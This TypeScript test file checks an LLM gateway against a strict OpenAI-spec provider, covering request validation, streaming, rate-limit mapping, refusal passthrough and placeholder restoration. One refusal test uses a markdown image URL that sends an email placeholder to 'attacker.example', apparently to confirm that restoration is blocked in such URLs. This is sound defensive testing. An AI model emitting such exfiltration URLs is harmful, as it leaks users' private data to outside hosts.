// The gateway against a provider that follows the OpenAI specification to
// the letter (Phase 7b, ADR-041 section 5; test/support/strict-provider.ts).
// First, the strict provider's own checks, each shown to fire (a checker
// that never complains proves nothing). Then the real gateway and adapter
// against it: every request shape the gateway forwards must pass every
// check, and every response shape the specification allows must be handled
// as decided.

import { afterEach, describe, expect, it } from 'vitest';
import {
  post,
  readStreamed,
  startTestGateway,
  TEST_MODEL,
  type TestGateway,
} from '../support/gateway.js';
import {
  requestViolations,
  strictProvider,
  type StrictProvider,
} from '../support/strict-provider.js';

const KEY = 'strict-test-key';
const SENTINELS = ['x-client-sentinel', 'cookie'];

let gateway: TestGateway | undefined;
afterEach(async () => {
  await gateway?.close();
  gateway = undefined;
});

async function againstStrict(): Promise<{ g: TestGateway; strict: StrictProvider }> {
  gateway = await startTestGateway({ apiKey: KEY });
  const strict = strictProvider(KEY, SENTINELS);
  gateway.provider.respondWith(strict.responder);
  return { g: gateway, strict };
}

/** A client request, with the client's own headers that must never reach the provider. */
const send = (g: TestGateway, body: Record<string, unknown>) =>
  post(g, body, { 'x-client-sentinel': 'from-the-client', cookie: 'session=abc' });

const chat = (extra: Record<string, unknown> = {}) => ({
  model: TEST_MODEL,
  messages: [
    { role: 'system', content: 'Be brief.' },
    { role: 'user', content: 'Hello.' },
    { role: 'assistant', content: 'Hi.' },
    { role: 'user', content: 'Again.' },
  ],
  ...extra,
});

describe("the strict provider's own checks fire (negative controls)", () => {
  const headers = { 'content-type': 'application/json', authorization: `Bearer ${KEY}` };
  const clean = { model: 'm', messages: [{ role: 'user', content: 'x' }] };
  const check = (body: unknown, h: Record<string, string> = headers) =>
    requestViolations({ headers: h, body: JSON.stringify(body) }, KEY, SENTINELS);

  it('a clean request has no violations', () => {
    expect(check(clean)).toEqual([]);
  });

  it.each([
    ['an unknown field', { ...clean, extra_field: 1 }, 'spec: unknown field extra_field'],
    [
      'stream_options without stream',
      { ...clean, stream_options: { include_usage: true } },
      'spec: stream_options set without stream: true',
    ],
    [
      'an unknown stream option',
      { ...clean, stream: true, stream_options: { other: 1 } },
      'spec: stream_options.other',
    ],
    [
      'five stop sequences',
      { ...clean, stop: ['a', 'b', 'c', 'd', 'e'] },
      'spec: more than 4 stop sequences',
    ],
    [
      'a stop that is not a string',
      { ...clean, stop: [1] },
      'spec: stop must be a string or an array of strings',
    ],
    [
      'an unknown reasoning effort',
      { ...clean, reasoning_effort: 'extreme' },
      'spec: reasoning_effort outside the specification',
    ],
    [
      'json_schema',
      { ...clean, response_format: { type: 'json_schema' } },
      'policy: response_format other than text or json_object',
    ],
    ['a temperature of 3', { ...clean, temperature: 3 }, 'spec: temperature outside 0..2'],
    ['a top_p of 2', { ...clean, top_p: 2 }, 'spec: top_p outside 0..1'],
    ['a penalty of 3', { ...clean, presence_penalty: 3 }, 'spec: presence_penalty outside -2..2'],
    ['max_tokens 0', { ...clean, max_tokens: 0 }, 'spec: max_tokens must be a positive integer'],
    ['a fractional seed', { ...clean, seed: 1.5 }, 'spec: seed must be an integer'],
    ['n of 2', { ...clean, n: 2 }, 'policy: n other than 1'],
    ['logprobs requested', { ...clean, logprobs: true }, 'policy: logprobs requested'],
    ['user forwarded', { ...clean, user: 'u1' }, 'policy: user forwarded'],
    ['tools forwarded', { ...clean, tools: [] }, 'policy: tools forwarded'],
    [
      'a developer message',
      { ...clean, messages: [{ role: 'developer', content: 'x' }] },
      'policy: message role developer',
    ],
    [
      'a message name',
      { ...clean, messages: [{ role: 'user', content: 'x', name: 'n' }] },
      'policy: message field name',
    ],
    [
      'message content parts',
      { ...clean, messages: [{ role: 'user', content: [] }] },
      'policy: message content is not a string',
    ],
    ['no messages', { ...clean, messages: [] }, 'spec: messages must be a non-empty array'],
    ['no model', { messages: clean.messages }, 'spec: model must be a string'],
  ])('flags %s', (_label, body, violation) => {
    expect(check(body)).toContain(violation);
  });

  it('flags headers: the wrong key, no Bearer, the wrong content type, a forwarded client header', () => {
    expect(check(clean, { ...headers, authorization: 'Bearer other' })).toContain(
      'spec: authorization must be exactly "Bearer <key>"',
    );
    expect(check(clean, { ...headers, authorization: KEY })).toContain(
      'spec: authorization must be exactly "Bearer <key>"',
    );
    expect(check(clean, { ...headers, 'content-type': 'text/plain' })).toContain(
      'spec: content-type must be application/json',
    );
    expect(check(clean, { ...headers, 'x-client-sentinel': 'x' })).toContain(
      'policy: client header x-client-sentinel forwarded',
    );
  });

  it('flags a body that is not JSON, or not an object', () => {
    expect(requestViolations({ headers, body: '{' }, KEY)).toContain('spec: body is not JSON');
    expect(requestViolations({ headers, body: '[]' }, KEY)).toContain(
      'spec: body is not an object',
    );
  });
});

describe('every request the gateway forwards passes the specification', () => {
  const requests: [string, Record<string, unknown>][] = [
    ['plain', chat()],
    [
      'every sampling option',
      chat({
        temperature: 0.7,
        top_p: 0.9,
        seed: 42,
        frequency_penalty: 0.5,
        presence_penalty: -0.5,
        max_tokens: 64,
      }),
    ],
    ['max_completion_tokens', chat({ max_completion_tokens: 64 })],
    ['json_object', chat({ response_format: { type: 'json_object' } })],
    ['text format', chat({ response_format: { type: 'text' } })],
    ['one stop string', chat({ stop: 'END' })],
    ['four stop sequences', chat({ stop: ['A', 'B', 'C', 'D'] })],
    [
      'user and safety_identifier, which the gateway drops',
      chat({ user: 'u-1', safety_identifier: 's-1' }),
    ],
    ['n 1 and logprobs false', chat({ n: 1, logprobs: false })],
    ...['none', 'minimal', 'low', 'medium', 'high', 'xhigh', 'max'].map(
      (effort): [string, Record<string, unknown>] => [
        `reasoning_effort ${effort}`,
        chat({ reasoning_effort: effort }),
      ],
    ),
  ];

  it.each(requests)('not streamed: %s', async (_label, body) => {
    const { g, strict } = await againstStrict();
    const response = await send(g, body);
    expect(strict.violations).toEqual([]);
    expect(response.statusCode).toBe(200);
  });

  it('both token limits: the gateway refuses them itself (ADR-014), so the provider never sees them', async () => {
    const { g, strict } = await againstStrict();
    const response = await send(g, chat({ max_tokens: 64, max_completion_tokens: 64 }));
    expect(response.statusCode).toBe(400);
    expect(g.provider.requests).toHaveLength(0);
    expect(strict.violations).toEqual([]);
  });

  it.each([
    ['without usage', chat({ stream: true })],
    ['with usage', chat({ stream: true, stream_options: { include_usage: true } })],
    ['with usage off', chat({ stream: true, stream_options: { include_usage: false } })],
    ['with a stop and sampling', chat({ stream: true, stop: ['X'], temperature: 0 })],
  ])('streamed: %s', async (_label, body) => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'stream', pieces: ['Hel', 'lo.'] };
    const response = await send(g, body);
    expect(strict.violations).toEqual([]);
    expect(response.statusCode).toBe(200);
    expect(readStreamed(response.body).done).toBe(true);
  });
});

describe('every answer the specification allows is handled as decided', () => {
  it('a complete answer with every optional field: the content and refusal: null, nothing else', async () => {
    const { g } = await againstStrict();
    const response = await send(g, chat());
    expect(response.statusCode).toBe(200);
    const body = response.json() as Record<string, unknown> & {
      choices: { message: Record<string, unknown>; finish_reason: string }[];
    };
    // `refusal` is on every message, null when there is none, as OpenAI's
    // specification requires (ADR-041 section 15, the refusal: null ruling).
    expect(body.choices[0]!.message).toEqual({
      role: 'assistant',
      content: 'Done.',
      refusal: null,
    });
    expect(body.choices[0]!.finish_reason).toBe('stop');
    // Fields the provider sent that the gateway does not pass on (ADR-014).
    expect(body).not.toHaveProperty('system_fingerprint', 'fp_strict');
    expect(body).not.toHaveProperty('service_tier');
  });

  it('a stream with usage: null on every chunk, an obfuscation field, comments and CRLF ends', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'stream', pieces: ['Hel', 'lo', ' there.'] };
    const response = await send(g, chat({ stream: true, stream_options: { include_usage: true } }));
    const streamed = readStreamed(response.body);
    expect(streamed.content).toBe('Hello there.');
    expect(streamed.done).toBe(true);
    expect(streamed.error).toBeUndefined();
    const usage = streamed.chunks.filter((c) => c.usage !== null && c.usage !== undefined);
    expect(usage).toHaveLength(1);
  });

  it('finish "length" with empty content: an empty answer, finish length', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'complete', content: '', finishReason: 'length' };
    const response = await send(g, chat());
    expect(response.statusCode).toBe(200);
    const body = response.json() as {
      choices: { message: { content: string }; finish_reason: string }[];
    };
    expect(body.choices[0]).toMatchObject({ message: { content: '' }, finish_reason: 'length' });
  });

  it.each(['tool_calls', 'function_call'])(
    'finish "%s" is refused: a 502, not an answer',
    async (reason) => {
      const { g, strict } = await againstStrict();
      strict.answer = { kind: 'complete', content: 'x', finishReason: reason };
      const response = await send(g, chat());
      expect(response.statusCode).toBe(502);
      expect((response.json() as { error: { code: string } }).error.code).toBe(
        'provider_bad_response',
      );
    },
  );

  it.each(['tool_calls', 'function_call'])(
    'finish "%s" mid-stream ends the stream with an error',
    async (reason) => {
      const { g, strict } = await againstStrict();
      strict.answer = { kind: 'stream', pieces: ['a'], finishReason: reason };
      const streamed = readStreamed((await send(g, chat({ stream: true }))).body);
      expect(streamed.content).toBe('a');
      expect(streamed.done).toBe(false);
      expect(streamed.error?.error.code).toBe('provider_bad_response');
    },
  );

  it.each([401, 500, 503])(
    'HTTP %i from the provider: a 502, nothing of its body passed on',
    async (status) => {
      const { g, strict } = await againstStrict();
      strict.answer = { kind: 'status', status };
      const response = await send(g, chat());
      expect(response.statusCode).toBe(502);
      expect(response.body).not.toContain('rate limited or failed');
    },
  );

  it('an error event mid-stream is read as the provider failing, not as a malformed chunk', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'stream', pieces: ['a', 'b', 'c'], errorAfter: 1 };
    const streamed = readStreamed((await send(g, chat({ stream: true }))).body);
    expect(streamed.content).toBe('a');
    expect(streamed.done).toBe(false);
    expect(streamed.error?.error.code).toBe('provider_error');
  });

  it('a stream cut before [DONE] ends with an error, never as a short answer', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'stream', pieces: ['a', 'b'], done: false };
    const streamed = readStreamed((await send(g, chat({ stream: true }))).body);
    expect(streamed.content).toBe('ab');
    expect(streamed.done).toBe(false);
    expect(streamed.error?.error.code).toBe('provider_bad_response');
  });
});

// ADR-041 section 15, decision 2 (option 2c, with c2): a provider 429 is a
// 503 to the client with the gateway's own fixed Retry-After. The
// provider's own Retry-After is never passed on (tension 2: it would tell
// the client about our provider relationship), and the client is never
// told it is the one rate limited (tension 1). No x-should-retry header
// (section 15 records why).
describe("a provider 429: a 503 with the gateway's own Retry-After", () => {
  /** The gateway's fixed value: at most 60 s, or openai-node ignores it. */
  const RETRY_AFTER = '30';
  const rateLimited = {
    type: 'api_error',
    code: 'provider_rate_limited',
    param: null,
  };

  it.each([
    ['with its own Retry-After of 20', '20'],
    ['with its own Retry-After of 3600', '3600'],
    ['with no Retry-After', undefined],
  ])('not streamed, the provider answers 429 %s', async (_label, retryAfter) => {
    const { g, strict } = await againstStrict();
    strict.answer = {
      kind: 'status',
      status: 429,
      ...(retryAfter === undefined ? {} : { retryAfter }),
    };
    const response = await send(g, chat());
    expect(response.statusCode).toBe(503);
    expect(response.headers['retry-after']).toBe(RETRY_AFTER);
    expect(response.headers['x-should-retry']).toBeUndefined();
    expect((response.json() as { error: unknown }).error).toMatchObject(rateLimited);
    expect(response.body).not.toContain('rate limited or failed');
  });

  it('streamed: the same 503 as an ordinary HTTP error, before any event', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'status', status: 429, retryAfter: '20' };
    const response = await send(g, chat({ stream: true }));
    expect(response.statusCode).toBe(503);
    expect(response.headers['content-type']).toMatch(/^application\/json/);
    expect(response.headers['retry-after']).toBe(RETRY_AFTER);
    expect((response.json() as { error: unknown }).error).toMatchObject(rateLimited);
  });

  // 400 left this list for 4b (ADR-041 sections 13 and 15), which this test
  // used to call "the 400 path untouched": 4b now owns that path, below.
  it('every other provider status keeps its 502 and gets no Retry-After', async () => {
    const { g, strict } = await againstStrict();
    for (const status of [401, 403, 404, 500, 503]) {
      strict.answer = { kind: 'status', status, retryAfter: '20' };
      const response = await send(g, chat());
      expect([status, response.statusCode]).toEqual([status, 502]);
      expect(response.headers['retry-after']).toBeUndefined();
      expect((response.json() as { error: { code: string } }).error.code).toBe('provider_error');
    }
  });

  it("a provider 400 is 4b's: a 400, and still no Retry-After whatever the provider sends", async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'status', status: 400, retryAfter: '20' };
    const response = await send(g, chat());
    expect(response.statusCode).toBe(400);
    expect(response.headers['retry-after']).toBeUndefined();
    expect((response.json() as { error: { code: string } }).error.code).toBe(
      'provider_rejected_request',
    );
  });
});

// ADR-041 section 15, decision 1 (option 1e), and bug-log 70. A refusal the
// provider names in `refusal` reaches the client in OpenAI's shape:
// `content: null` and the refusal text, restored like any model text, in
// `refusal`; streamed, as `delta.refusal` chunks. All three shapes are sent:
// the loud one (content null), and the two bug 70 found quiet (content "",
// and a streamed refusal), which reached the client as an empty answer.
describe("a refusal the provider names reaches the client in OpenAI's shape", () => {
  // The client's own value; the provider only ever sees [EMAIL_1].
  const EMAIL = 'asha.rao@example.com';
  const withValue = (extra: Record<string, unknown> = {}) => ({
    model: TEST_MODEL,
    messages: [{ role: 'user', content: `Please write to ${EMAIL} for me.` }],
    ...extra,
  });
  type Message = { content: string | null; refusal?: string };
  const message = (body: unknown): Message =>
    (body as { choices: { message: Message }[] }).choices[0]!.message;

  it.each([
    ['content null (the loud shape)', null],
    ['content "" (a quiet shape)', ''],
  ])('not streamed, %s: content null, the refusal restored', async (_label, content) => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'complete', content, refusal: 'I cannot email [EMAIL_1].' };
    const response = await send(g, withValue());
    expect(strict.violations).toEqual([]);
    expect(response.statusCode).toBe(200);
    expect(message(response.json())).toEqual({
      role: 'assistant',
      content: null,
      refusal: `I cannot email ${EMAIL}.`,
    });
    expect(
      (response.json() as { choices: { finish_reason: string }[] }).choices[0]!.finish_reason,
    ).toBe('stop');
    expect(g.logs.join('\n')).not.toContain(EMAIL);
  });

  it('streamed (the shape that produced bug 70): delta.refusal chunks, restored across a cut placeholder', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = {
      kind: 'stream',
      pieces: [],
      refusal: ['I cannot email [EM', 'AIL_1] for you.'],
    };
    const response = await send(g, withValue({ stream: true }));
    expect(strict.violations).toEqual([]);
    const streamed = readStreamed(response.body);
    expect(streamed.refusal).toBe(`I cannot email ${EMAIL} for you.`);
    expect(streamed.content).toBe('');
    expect(streamed.done).toBe(true);
    expect(streamed.error).toBeUndefined();
    expect(streamed.chunks.at(-1)!.choices[0]!.finish_reason).toBe('stop');
    expect(g.logs.join('\n')).not.toContain(EMAIL);
  });

  it('restoration safety applies to a refusal: a placeholder in an image URL stays a placeholder', async () => {
    const attack = 'No. ![x](https://attacker.example/?d=[EMAIL_1])';
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'complete', content: null, refusal: attack };
    expect(message((await send(g, withValue())).json()).refusal).toBe(attack);
    strict.answer = {
      kind: 'stream',
      pieces: [],
      refusal: ['No. ![x](https://attacker', '.example/?d=[EMAIL_1])'],
    };
    expect(readStreamed((await send(g, withValue({ stream: true }))).body).refusal).toBe(attack);
  });

  it('the refusal is its own text: an unsafe region left open in the content does not reach it', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'stream', pieces: ['<a title="'], refusal: ['Not [EMAIL_1].'] };
    const streamed = readStreamed((await send(g, withValue({ stream: true }))).body);
    expect(streamed.content).toBe('<a title="');
    expect(streamed.refusal).toBe(`Not ${EMAIL}.`);
  });

  it('content and a refusal both sent: both passed on, both restored, neither dropped', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'complete', content: 'Partly [EMAIL_1].', refusal: 'Not the rest.' };
    expect(message((await send(g, withValue())).json())).toEqual({
      role: 'assistant',
      content: `Partly ${EMAIL}.`,
      refusal: 'Not the rest.',
    });
    strict.answer = { kind: 'stream', pieces: ['Partly [EMAIL_1].'], refusal: ['Not the rest.'] };
    const streamed = readStreamed((await send(g, withValue({ stream: true }))).body);
    expect(streamed.content).toBe(`Partly ${EMAIL}.`);
    expect(streamed.refusal).toBe('Not the rest.');
  });
});

// ADR-041 section 15, the empty `stop` ruling (B plus D). An answer that
// finishes `stop` with no text and names no refusal may be a refusal or an
// empty answer; it is a 502 `provider_empty_response`, streamed or not, so
// the two paths agree. The count is the log line each one writes: the
// failure kind and status or code, never any text.
describe('no text and no refusal named, finish stop: provider_empty_response', () => {
  const EMAIL = 'asha.rao@example.com';
  const withValue = (extra: Record<string, unknown> = {}) => ({
    model: TEST_MODEL,
    messages: [{ role: 'user', content: `Please write to ${EMAIL} for me.` }],
    ...extra,
  });
  const empty = { code: 'provider_empty_response', type: 'api_error' };
  /** The log lines that record an empty answer: the count ruling D asks for. */
  const emptyLines = (g: TestGateway): Record<string, unknown>[] =>
    g.logs
      .map((line) => JSON.parse(line) as Record<string, unknown>)
      .filter((line) => JSON.stringify(line).includes('empty_response'));

  it.each([
    ['content "", refusal null', '', null],
    ['content "", refusal ""', '', ''],
    ['content null, refusal null', null, null],
    ['content null, refusal ""', null, ''],
  ])('not streamed, %s: a 502, one log line, no text in it', async (_label, content, refusal) => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'complete', content, refusal };
    const response = await send(g, withValue());
    expect(response.statusCode).toBe(502);
    expect((response.json() as { error: unknown }).error).toMatchObject(empty);
    const lines = emptyLines(g);
    expect(lines).toHaveLength(1);
    expect(lines[0]).toMatchObject({
      msg: 'request failed',
      statusCode: 502,
      error: { name: 'ProviderError', failure: 'empty_response' },
    });
    expect(g.logs.join('\n')).not.toContain(EMAIL);
  });

  it('streamed, no text: the error event with the same code, no finish chunk, no [DONE]', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'stream', pieces: [] };
    const streamed = readStreamed((await send(g, withValue({ stream: true }))).body);
    expect(streamed.content).toBe('');
    expect(streamed.error?.error).toMatchObject(empty);
    expect(streamed.done).toBe(false);
    expect(streamed.chunks.some((c) => c.choices[0]?.finish_reason)).toBe(false);
    const lines = emptyLines(g);
    expect(lines).toHaveLength(1);
    expect(lines[0]).toMatchObject({
      msg: 'stream failed',
      code: 'provider_empty_response',
      error: { failure: 'empty_response' },
    });
    expect(g.logs.join('\n')).not.toContain(EMAIL);
  });

  it('streamed and not streamed agree: the same code for the same empty answer', async () => {
    const { g, strict } = await againstStrict();
    strict.answer = { kind: 'complete', content: null };
    const plain = (await send(g, chat())).json() as { error: { code: string } };
    strict.answer = { kind: 'stream', pieces: [] };
    const streamed = readStreamed((await send(g, chat({ stream: true }))).body);
    expect(streamed.error?.error.code).toBe(plain.error.code);
  });

  it.each(['length', 'content_filter'])(
    'finish %s with no text is kept, streamed or not: the finish reason says why',
    async (finishReason) => {
      const { g, strict } = await againstStrict();
      strict.answer = { kind: 'complete', content: null, finishReason };
      const response = await send(g, chat());
      expect(response.statusCode).toBe(200);
      expect((response.json() as { choices: { message: unknown }[] }).choices[0]!.message).toEqual({
        role: 'assistant',
        content: null,
        refusal: null,
      });
      strict.answer = { kind: 'stream', pieces: [], finishReason };
      const streamed = readStreamed((await send(g, chat({ stream: true }))).body);
      expect([streamed.done, streamed.chunks.at(-1)!.choices[0]!.finish_reason]).toEqual([
        true,
        finishReason,
      ]);
      expect(emptyLines(g)).toHaveLength(0);
    },
  );
});
